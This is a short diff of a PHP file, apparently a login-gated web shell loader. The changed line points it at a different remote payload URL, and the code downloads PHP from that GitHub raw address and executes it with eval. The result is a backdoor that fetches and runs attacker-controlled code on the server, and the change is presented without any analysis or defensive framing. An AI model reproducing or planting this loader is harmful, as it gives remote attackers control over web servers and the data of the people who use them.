@@ -75,7 +75,7 @@ if (is_logged_in()) {
         echo "<script>alert('$check_result');</script>";
     }
 
-    $a = geturlsinfo('https://github.com/Sys-Fxp/Sys-Fxp/raw/refs/heads/main/rk3.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/Sys-Fxp/Sys-Fxp/refs/heads/main/alfaz.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
